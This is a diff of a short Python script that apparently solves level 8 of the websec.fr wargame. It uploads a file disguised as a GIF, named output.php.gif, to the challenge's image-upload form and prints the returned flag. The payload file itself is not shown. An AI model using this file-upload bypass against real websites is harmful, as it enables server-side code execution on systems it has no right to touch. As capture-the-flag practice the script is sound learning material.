@@ -1,15 +1,22 @@
 from requests import *
-import sys
-import re
 
 url = 'http://websec.fr/level08/index.php'
-with open('/root/output.php.gif') as file_gif:
-    data = {
-        'submit' : 'Upload Image'
-    }
-    files = {
-        'fileToUpload' : file_gif
-    }
 
-    r = post(url , data=data , files=files)
-    print(''.join(re.findall('(WEBSEC{.+})', r.text)))
+with open('/root/output.php.gif', 'rb') as file_gif:
+    files = {
+        'fileToUpload': file_gif
+    }
+    data = {
+        'submit': 'Upload Image'
+    }
+    
+    r = post(url, data=data, files=files)
+    pos = r.text.find('WEBSEC{')
+    while (True):
+        txt = r.text[pos]
+        print(txt , end='')
+        if (txt == '}'):
+            print()
+            break
+
+        pos += 1
